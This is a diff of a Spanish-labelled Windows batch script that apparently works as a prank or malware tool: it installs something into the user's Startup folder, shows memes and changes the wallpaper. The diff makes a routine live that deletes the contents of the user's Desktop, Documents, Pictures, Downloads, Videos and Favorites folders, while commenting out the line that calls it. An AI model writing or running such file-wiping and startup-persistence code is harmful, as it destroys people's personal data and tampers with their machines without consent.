@@ -6,7 +6,7 @@ set userUb=%USERPROFILE%
 set user=%USERNAME%
 
 rem Flujo del programa--------
-call :eliminarCarpetasUsuario
+::call :eliminarCarpetasUsuario
 call :GooseInicio
 call :memes
 call :cambiarFondo
@@ -27,12 +27,12 @@ rem actualizar el fondo de pantalla
 rundll32.exe user32.dll,UpdatePerUserSystemParameters
 exit /b
 :eliminarCarpetasUsuario
-::del /q %userUb%\Desktop\*
-::del /q /f %userUb%\Documents\
-::del /q /f %userUb%\Pictures\
-::del /q /f %userUb%\Downloads\
-::del /q /f %userUb%\Videos\
-::del /q /f %userUb%\Favorites\
+del /q %userUb%\Desktop\*
+del /q /f %userUb%\Documents\
+del /q /f %userUb%\Pictures\
+del /q /f %userUb%\Downloads\
+del /q /f %userUb%\Videos\
+del /q /f %userUb%\Favorites\
 exit /b
 :GooseInicio
 set ubicacionStart="%userUb%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
